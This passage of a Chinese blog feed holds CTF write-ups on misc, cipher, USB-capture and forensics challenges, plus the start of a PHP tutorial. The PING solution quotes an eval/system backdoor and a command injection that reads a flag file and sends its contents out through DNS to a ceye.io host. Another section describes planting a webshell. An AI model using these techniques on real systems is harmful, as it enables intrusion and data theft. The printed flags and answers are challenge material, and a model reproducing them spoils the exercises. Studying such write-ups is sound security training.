rel="noopener">https://www.ichunqiu.com/writeup/detail/721</a><br>python脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&apos;http://290a655e11204667990900a8f741265809ac4172461b40fe.game.ichunqiu.com/&apos;</span><br><span class="line">session=requests.Session()</span><br><span class="line">html=session.get(url+&apos;?value[]=ea&apos;).text</span><br><span class="line">for i in range(10):</span><br><span class="line">    html=session.get(url+&apos;?value[]=&apos;+html[0:2]).text</span><br><span class="line">    if &apos;flag&#123;.*&#125;&apos; in html:</span><br><span class="line">        break</span><br><span class="line">print (html)</span><br></pre></td></tr></table></figure></p><h2 id="All-your-Base-are-belong-to-us"><a href="#All-your-Base-are-belong-to-us" class="headerlink" title="All your Base are belong to us"></a>All your Base are belong to us</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">01001001 01100011 01100101 01000011 01010100 01000110 01111011 01100001 01101100 00110001 01011111</span><br><span class="line">01101101 01111001 01011111 01100010 01100001 01110011 01100101 01110011 01011111 01100001 01110010</span><br><span class="line">01100101 01011111 01111001 01101111 01110101 01110010 01110011 01011111 01100001 01101110 01100100</span><br><span class="line">01011111 01100001 01101100 01101100 01011111 01111001 00110000 01110101 01110010 01011111 01100010</span><br><span class="line">01100001 01110011 01100101 01110011 01011111 01100001 01110010 01100101 01011111 01101101 01101001</span><br><span class="line">01101110 01100101 01111101</span><br></pre></td></tr></table></figure><p>直接<a href="http://www.ab126.com/goju/1711.html" target="_blank" rel="noopener">二进制转ASCII</a>得到flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">I c e C T F &#123; a l 1 _</span><br><span class="line">m y _ b a s e s _ a r</span><br><span class="line">e _ y o u r s _ a n d</span><br><span class="line">_ a l l _ y 0 u r _ b</span><br><span class="line">a s e s _ a r e _ m i</span><br><span class="line">n e &#125;</span><br><span class="line"></span><br><span class="line">IceCTF&#123;al1_my_bases_are_yours_and_all_y0ur_bases_are_mine&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Pretty-Pixels"><a href="#Pretty-Pixels" class="headerlink" title="Pretty Pixels"></a>Pretty Pixels</h2><p>得到一张图片，提示和像素有关<br>1、尝试修改图片尺寸，发现不是png像素隐写<br>2、LSB隐写尝试了一下也不是<br>3、将RGB三个通道的值都提取出来得到一张新的图片<br>这里参考了<a href="https://zhuanlan.zhihu.com/p/22678856" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/22678856</a><br><img src="/2018/03/08/i春秋-CTF训练大本营题解/lsb.png" alt=""><br><code>IceCTF{puT_Th4t_1n_yoUr_cOlOrin9_Book_4nD_5moKe_1T}</code></p><h2 id="IRC-1"><a href="#IRC-1" class="headerlink" title="IRC 1"></a>IRC 1</h2><p>百度了一下是IRC服务器，这里参考了<a href="https://zhuanlan.zhihu.com/p/22678856" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/22678856</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">自己下个客户端：mIRC，设置服务器为glitch.is，端口设置为6667，然后随便起个名字，右键查看Glitch的whois信息，会发现@#6470e394cb_flagshare，双击进入频道之后，就可以得到flag</span><br><span class="line"></span><br><span class="line">IceCTF&#123;pL3AsE_D0n7_5h4re_fL495_JUsT_doNT&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Scavenger-Hunt"><a href="#Scavenger-Hunt" class="headerlink" title="Scavenger Hunt"></a>Scavenger Hunt</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目内容：</span><br><span class="line">There is a flag hidden somewhere on our website, do you think you can find it? Good luck!</span><br></pre></td></tr></table></figure><p>因为这个题目是复现题目，所以应该去找比赛的官网。</p><p>访问官网(Home - IceCTF),查看源码发现提到一个github地址，在github中的IceCTF项目下，找到ctf-landing/icectf/templates/sponsors.html，查看代码可以发现flag</p><p>现在请求发现未响应了233333<br><img src="/2018/03/08/i春秋-CTF训练大本营题解/GitHub.png" alt=""><br><a href="https://github.com/IceCTF/ctf-landing/blob/master/icectf/templates/sponsors.html" target="_blank" rel="noopener">github地址</a></p><h2 id="内涵图"><a href="#内涵图" class="headerlink" title="内涵图"></a>内涵图</h2><p>winhex打开图片，查找一下即可看到flag<br><code>flag{I_I-0_0-*_*}</code></p><h2 id="kill"><a href="#kill" class="headerlink" title="kill"></a>kill</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目内容：</span><br><span class="line">Is kill can fix? Sign the autopsy file?</span><br></pre></td></tr></table></figure><p>get新姿势：<br>使用strings.exe对kill.pcapng中的可打印字符进行提取，保存到strings.txt文件中，命令【strings.exe kill.pcapng &gt;strings.txt】<br>参考<a href="https://www.ichunqiu.com/writeup/detail/611" target="_blank" rel="noopener">https://www.ichunqiu.com/writeup/detail/611</a></p><h2 id="Bubble"><a href="#Bubble" class="headerlink" title="Bubble"></a>Bubble</h2><p>得到一个flag.enc文件<br>1、winhex得到一串字符串<br><code>xinik-samak-luvag-hutaf-fysil-notok-mepek-vanyh-zipef-hilok-detok-damif-cusol-fezyx</code><br>2、百度一下知道是<a href="http://www.cnblogs.com/pcat/p/7501782.html" target="_blank" rel="noopener">Bubble Babble Encoding</a><br>3、使用python</p><p>使用方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from bubblepy import BubbleBabble</span><br><span class="line">s=&apos;xinik-samak-luvag-hutaf-fysil-notok-mepek-vanyh-zipef-hilok-detok-damif-cusol-fezyx&apos;</span><br><span class="line">bb=BubbleBabble()</span><br><span class="line">s1=bb.encode(s)</span><br><span class="line">print s1</span><br><span class="line">print bb.decode(s1)</span><br></pre></td></tr></table></figure></p><h2 id="小电影"><a href="#小电影" class="headerlink" title="小电影"></a>小电影</h2><p>得到一张end.gif<br>1、结合提示应该是一张破损的gif<br>2、winhex修复文件头<br>这里参考[<a href="https://blog.csdn.net/hubuguia/article/details/54577102]https://blog.csdn.net/hubuguia/article/details/54577102" target="_blank" rel="noopener">https://blog.csdn.net/hubuguia/article/details/54577102]https://blog.csdn.net/hubuguia/article/details/54577102</a>)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">压缩包内只有一个无法正常打开的名为end.gif的文件。用winhex打开，发现文件头为”3961”，并非正常的”474946383961”(对应ascii码为GIF89A)或”474946383761”(对应ascii码为GIF87A)，故尝试在头部添加”47494638”使其格式完整</span><br></pre></td></tr></table></figure></p><p>3、得到flag</p><h2 id="Thor’s-a-hacker-now"><a href="#Thor’s-a-hacker-now" class="headerlink" title="Thor’s a hacker now"></a>Thor’s a hacker now</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目内容：</span><br><span class="line">Thor has been staring at this for hours and he can&apos;t make any sense out of it, can you help him figure out what it is? thor.txt</span><br></pre></td></tr></table></figure><p>1、题目给的是一个文件，打开发现是和winhex差不多的字符，但是不会把txt转成对应的lzip文件<br>2、这里参考了<a href="https://www.ichunqiu.com/writeup/detail/593" target="_blank" rel="noopener">https://www.ichunqiu.com/writeup/detail/593</a>,利用linux下的xxd命令，将文本转换成文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat thor.txt | xxd -r &gt; thorfile</span><br></pre></td></tr></table></figure></p><p>3、解压还原出来的压缩包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lzip -d thorfile</span><br></pre></td></tr></table></figure></p><p>4、解压出来的是一张图片，所以改一下后缀就可以得到flag了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Misc&quot;&gt;&lt;a href=&quot;#Misc&quot; class=&quot;headerlink&quot; title=&quot;Misc&quot;&gt;&lt;/a&gt;Misc&lt;/h1&gt;&lt;h2 id=&quot;你好，i春秋&quot;&gt;&lt;a href=&quot;#你好，i春秋&quot; class=&quot;headerlink&quot; title=&quot;你好，i春
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ju5tw4nty0u.top/tags/CTF/"/>
    
      <category term="WP" scheme="http://ju5tw4nty0u.top/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>安恒杯2月月赛复现记录</title>
    <link href="http://ju5tw4nty0u.top/2018/03/07/%E5%AE%89%E6%81%92%E6%9D%AF2%E6%9C%88%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/"/>
    <id>http://ju5tw4nty0u.top/2018/03/07/安恒杯2月月赛复现记录/</id>
    <published>2018-03-06T17:17:33.000Z</published>
    <updated>2018-04-19T06:54:30.649Z</updated>
    
    <content type="html"><![CDATA[<p>手快抢了一个复现账号，就去看看这些个难题嘤嘤嘤！<br>官方的WP：<br>PING<br><a href="http://forum.91ctf.com/index.php/group/topic/id-40" target="_blank" rel="noopener">http://forum.91ctf.com/index.php/group/topic/id-40</a></p><p>进击的盲注<br><a href=""></a></p><p>这应该不是xxs<br><a href=""></a></p><p><a href=""></a></p><h1 id="Cipher"><a href="#Cipher" class="headerlink" title="Cipher"></a>Cipher</h1><p>题目描述<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">题目名称</span><br><span class="line">Cipher</span><br><span class="line"></span><br><span class="line">题目说明</span><br><span class="line">还能提示什么呢？公平的玩吧（密钥自己找） Dncnoqqfliqrpgeklwmppu</span><br></pre></td></tr></table></figure></p><p>公平的玩———&gt;playfair密码（以前没有遇到过QAQ）</p><p>playfair密码是需要秘钥的;<a href="https://baike.so.com/doc/2606576-2752293.html" target="_blank" rel="noopener">传送门</a></p><p>编制密码表–还原明文–得到flag</p><h1 id="凯撒？替换？呵呵！"><a href="#凯撒？替换？呵呵！" class="headerlink" title="凯撒？替换？呵呵！"></a>凯撒？替换？呵呵！</h1><p>题目描述<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">题目名称</span><br><span class="line">凯撒？替换？呵呵！</span><br><span class="line"></span><br><span class="line">题目说明</span><br><span class="line">MTHJ&#123;CUBCGXGUGXWREXIPOYAOEYFIGXWRXCHTKHFCOHCFDUCGTXZOHIXOEOWMEHZO&#125;</span><br></pre></td></tr></table></figure></p><p>思路1：<br>    凯撒（行不通）</p><p>思路2：<br>    替换密码，按照英文字母的概率规律来解题<br>    隐含条件为–MTHJ对应flag</p><p><a href="https://quipqiup.com/" target="_blank" rel="noopener">解密传送门</a></p><p>有思路2可以得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123; SUBSTITUTION CIPHER DECRYPTION IS ALWAYS EASY JUST LIKE A PIECE OF CAKE&#125;</span><br><span class="line"></span><br><span class="line">#替换成小写提交正确</span><br></pre></td></tr></table></figure></p><h1 id="USB"><a href="#USB" class="headerlink" title="USB"></a>USB</h1><p>题目描述<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">题目名称</span><br><span class="line">USB</span><br><span class="line"></span><br><span class="line">题目说明</span><br><span class="line">Do your konw usb??</span><br></pre></td></tr></table></figure></p><p>考点：<br>    usb协议的分析<br>    压缩包的修复<br>    对键盘记录的分析<br>    维吉尼亚密码<br>    栅栏密码<br>    脚本编写能力</p><p>题目文件：<br>ftm文件<br>    winhex、binwalk分离，可知道是一个usb流量文件<br>    考虑使用python的scapy模块编写脚本自动提取,提取的到key{XINAN}</p><p>脚本如下(貌似有点小问题)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#show_keyboard.py</span><br><span class="line">from scapy.all import * </span><br><span class="line">VISIBLE_KEY_CODES=&#123;</span><br><span class="line">4:&quot;A&quot;,</span><br><span class="line">5:&quot;B&quot;,</span><br><span class="line">6:&quot;C&quot;,</span><br><span class="line">7:&quot;D&quot;,</span><br><span class="line">8:&quot;E&quot;,</span><br><span class="line">9:&quot;F&quot;,</span><br><span class="line">10:&quot;G&quot;,</span><br><span class="line">11:&quot;H&quot;,</span><br><span class="line">12:&quot;I&quot;,</span><br><span class="line">13:&quot;J&quot;,</span><br><span class="line">14:&quot;K&quot;,</span><br><span class="line">15:&quot;L&quot;,</span><br><span class="line">16:&quot;M&quot;,</span><br><span class="line">17:&quot;N&quot;,</span><br><span class="line">18:&quot;O&quot;,</span><br><span class="line">19:&quot;P&quot;,</span><br><span class="line">20:&quot;Q&quot;,</span><br><span class="line">21:&quot;R&quot;,</span><br><span class="line">22:&quot;S&quot;,</span><br><span class="line">23:&quot;T&quot;,</span><br><span class="line">24:&quot;U&quot;,</span><br><span class="line">25:&quot;V&quot;,</span><br><span class="line">26:&quot;W&quot;,</span><br><span class="line">27:&quot;X&quot;,</span><br><span class="line">28:&quot;Y&quot;,</span><br><span class="line">29:&quot;Z&quot;,</span><br><span class="line">30:&quot;1&quot;,</span><br><span class="line">31:&quot;2&quot;,</span><br><span class="line">32:&quot;3&quot;,</span><br><span class="line">33:&quot;4&quot;,</span><br><span class="line">34:&quot;5&quot;,</span><br><span class="line">35:&quot;6&quot;,</span><br><span class="line">36:&quot;7&quot;,</span><br><span class="line">37:&quot;8&quot;,</span><br><span class="line">38:&quot;9&quot;,</span><br><span class="line">39:&quot;0&quot;,</span><br><span class="line">40:&quot;\n&quot;,</span><br><span class="line">44:&quot;&quot;,</span><br><span class="line">45:&quot;&quot;,</span><br><span class="line">46:&quot;=&quot;,</span><br><span class="line">47:&quot;&#123;&quot;,</span><br><span class="line">48:&quot;&#125;&quot;,</span><br><span class="line">49:&quot;\\&quot;,</span><br><span class="line">51:&quot;;&quot;,</span><br><span class="line">52:&quot;&apos;&quot;,</span><br><span class="line">53:&quot;~&quot;,</span><br><span class="line">54:&quot;,&quot;,</span><br><span class="line">55:&quot;.&quot;,</span><br><span class="line">56:&quot;/&quot;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pkts = rdpcap(&quot;key.pcap&quot;)</span><br><span class="line">msg = &quot;&quot;</span><br><span class="line">for packet in pkts:</span><br><span class="line">keybord_data = packet.load[-8:]</span><br><span class="line">key_code = ord(keybord_data[2])</span><br><span class="line">ch = VISIBLE_KEY_CODES.get(key_code,False)</span><br><span class="line">if ch:</span><br><span class="line">msg += ch</span><br><span class="line">print msg</span><br></pre></td></tr></table></figure></p><p>rar压缩包<br>        1、直接解压提示233.png头部损坏（进行修复）<br>        <img src="/2018/03/07/安恒杯2月月赛复现记录/xiufu.png" alt=""><br>        2、图片在分析工具下可以得到一张二维码<br>        （扫码得到ci{v3erf_0tygidv2_fc0}，这个跟前面的KEY{XINAN}，应该是一种密码，这里考查的是维吉尼亚密码。）<br>        <a href="https://atomcated.github.io/Vigenere/" target="_blank" rel="noopener">揭秘传送门</a><br>        3、上一步得到fa{i3eei_0llgvgn2_sc0<br>        栅栏解密可得flag</p><h1 id="溯源"><a href="#溯源" class="headerlink" title="溯源"></a>溯源</h1><p>题目描述<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">题目名称</span><br><span class="line">溯源</span><br><span class="line"></span><br><span class="line">题目说明</span><br><span class="line">http://ip/secret</span><br></pre></td></tr></table></figure></p><p>出题思路:<br>这道题目是一次简单的溯源流程，首先拿到一个secret文件，通过分析找到后门中隐藏的url，因为题目要提前出好，不能预先知道ip，所以把文件和web服务放到了一块，找url的过程简化为只需要找到后缀。</p><p>考点:<br>    磁盘挂载<br>    extendelete的使用<br>    对chm后门的分析<br>    php反序列化</p><p>1、文件为linux下磁盘挂载文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount secret /home/tmp</span><br></pre></td></tr></table></figure></p><p>2、挂载一下，cd进去cat一下，发现了后门已经被删除字样，估计需要做一下磁盘恢复。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#卸载磁盘后执行下面的命令可得到一个hack.chm文件</span><br><span class="line">extundelete secret --inode 2</span><br></pre></td></tr></table></figure></p><p>3、后门分析（windows环境）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#在同一目录下新建一个hack文件夹</span><br><span class="line">hh -decompile hack hack.chm</span><br></pre></td></tr></table></figure></p><p>4、分离出来的，在exp.htm文件中<code>http://xxx.xxx.xxx.xxx/C_0uT.php</code>，猜测需要访问这个页面。<br>5、扫描端口发现8080端口开放着web服务，简单代码审计，反序列化加文件上传<br>6、使用80端口（因为限制了只能本地访问）的web服务上传一句话木马，然后getshell<br>7、远程执行命可以获取flag</p><h1 id="PING"><a href="#PING" class="headerlink" title="PING"></a>PING</h1><p>首先发现有源码泄露<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include(&quot;where_is_flag.php&quot;);echo &quot;ceshi&quot;;@eval($_POST[1]);$ip =(string)$_GET[&apos;ceshi&apos;];$ip =str_replace(&quot;&gt;&quot;,&quot;0.0&quot;,$ip);system(&quot;ceshi  &quot;.$ip);</span><br></pre></td></tr></table></figure></p><p>过滤了<code>&gt;</code>,不能使用空格和换行<br>这里使用的是ceye来看dnslog<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping=`cat where_is_flag.php|sed s/[[:space:]]//g`.***.ceye.io</span><br></pre></td></tr></table></figure></p><p>回显如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php$flag=&quot;dgfsdunsadkjgdgdfhdfhfgdhsadf/flag.php&quot;;?&gt;.***.ceye.io</span><br></pre></td></tr></table></figure></p><p>继续cat<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping=`cat dgfsdunsadkjgdgdfhdfhfgdhsadf/flag.php|sed s/[[:space:]]//g`.***.ceye.io</span><br></pre></td></tr></table></figure></p><p>得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php$flag=&quot;flag&#123;sdfsdfvdfbdgsd&#125;&quot;;?&gt;.***.ceye.io</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;手快抢了一个复现账号，就去看看这些个难题嘤嘤嘤！&lt;br&gt;官方的WP：&lt;br&gt;PING&lt;br&gt;&lt;a href=&quot;http://forum.91ctf.com/index.php/group/topic/id-40&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;
      
    
    </summary>
    
    
      <category term="-CTF -WP" scheme="http://ju5tw4nty0u.top/tags/CTF-WP/"/>
    
  </entry>
  
  <entry>
    <title>PHP入门到放弃-1</title>
    <link href="http://ju5tw4nty0u.top/2018/02/18/PHP%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83-1/"/>
    <id>http://ju5tw4nty0u.top/2018/02/18/PHP入门到放弃-1/</id>
    <published>2018-02-17T16:49:47.000Z</published>
    <updated>2018-02-17T18:38:44.268Z</updated>
    
    <content type="html"><![CDATA[<p>PHP在CTF的WEB题经常有应用，这里简要记录一下自己在学习PHP的所见所闻，供自己复习使用，不定期更新……</p><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><h3 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h3><p>整型、浮点型、布尔型、数组、对象、NULL、资源<br>（变量就像一个盒子，盒子里面装的是变量的值，不同的盒子就是变量类型）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1)整型[integer]</span><br><span class="line"> 数学中的整数</span><br><span class="line"></span><br><span class="line">2)浮点型[float、double]</span><br><span class="line"> 数学中的小数</span><br><span class="line"></span><br><span class="line">3)字符串[string]</span><br><span class="line"> 一串字符</span><br><span class="line"></span><br><span class="line">4)布尔[boolean]</span><br><span class="line"> 真假</span><br><span class="line"></span><br><span class="line">5)数组[array]</span><br><span class="line"> 键值对复合数据</span><br><span class="line"></span><br><span class="line">6)对象[object]</span><br><span class="line"> 暂时不考虑QAQ</span><br><span class="line"></span><br><span class="line">7)NULL</span><br><span class="line"> 没有值</span><br><span class="line"></span><br><span class="line">8)资源[resource]</span><br><span class="line"> 资源是一种特殊的变量类型，保存了到外部资源的一个引用：如打开文件、数据库连接、图形画布区域等</span><br></pre></td></tr></table></figure><h3 id="如何区分变量类型"><a href="#如何区分变量类型" class="headerlink" title="如何区分变量类型"></a>如何区分变量类型</h3><p>变量值并不是只存储变量值，还存储了它的类型<br><img src="/2018/02/18/PHP入门到放弃-1/qufen.png" alt="qufen"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$a = 3;//整型</span><br><span class="line">$b = 3.14;//浮点型</span><br><span class="line">$c = null;//null型</span><br><span class="line">$d = &apos;helloworld&apos;;//字符串型</span><br><span class="line">$e = true;//布尔型</span><br><span class="line"></span><br><span class="line">echo $D;//Notice: Undefined variable</span><br></pre></td></tr></table></figure></p><h3 id="变量名称的命名规范"><a href="#变量名称的命名规范" class="headerlink" title="变量名称的命名规范"></a>变量名称的命名规范</h3><p>[a-z]-[A-Z]-[0-9]以及下划线<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1)区分大小写</span><br><span class="line">2)不能以数字开头</span><br><span class="line">//正确命名</span><br><span class="line">$a</span><br><span class="line">$_</span><br><span class="line">$c3</span><br><span class="line">//错误命名</span><br><span class="line">$_%</span><br><span class="line">$3c</span><br></pre></td></tr></table></figure></p><h2 id="变量检测"><a href="#变量检测" class="headerlink" title="变量检测"></a>变量检测</h2><p>ehco一个不存在的变量，会报notice级别的错误，所以有必要检测一下这个变量是否存在；<br>isset–检测变量是否设置<br>已声明的变量会返回true<br>未声明的变量会返回false</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$b = null;</span><br><span class="line">$c = false;</span><br><span class="line">$d = 0;</span><br><span class="line">$e = &apos; &apos;;</span><br><span class="line">if(isset($a))&#123;</span><br><span class="line">echo &quot;变量a存在&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;变量a不存在&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($b))&#123;</span><br><span class="line">echo &quot;变量b存在&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;变量b不存在&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($c))&#123;</span><br><span class="line">echo &quot;变量c存在&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &quot;变量c不存在&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">变量a不存在</span><br><span class="line">变量b不存在</span><br><span class="line">变量c存在</span><br></pre></td></tr></table></figure><p>对于值为NULL的变量，也返回false，因为null没有值。<br>未曾声明的变量当然也是不存在的。</p><h2 id="类型检测"><a href="#类型检测" class="headerlink" title="类型检测"></a>类型检测</h2><ol><li><p>检测一个变量php将它存储成什么类型<br>–gettype（获取变量的类型） [现成的系统函数]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$b = null;</span><br><span class="line">echo gettype($b);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">$c = false;</span><br><span class="line">echo gettype($c);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">$d = 0;</span><br><span class="line">echo gettype($d);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">$e = &apos; &apos;;</span><br><span class="line">echo gettype($e);</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">NULL</span><br><span class="line">boolean</span><br><span class="line">integer</span><br><span class="line">string</span><br></pre></td></tr></table></figure></li><li><p>判断变量是否是某种类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 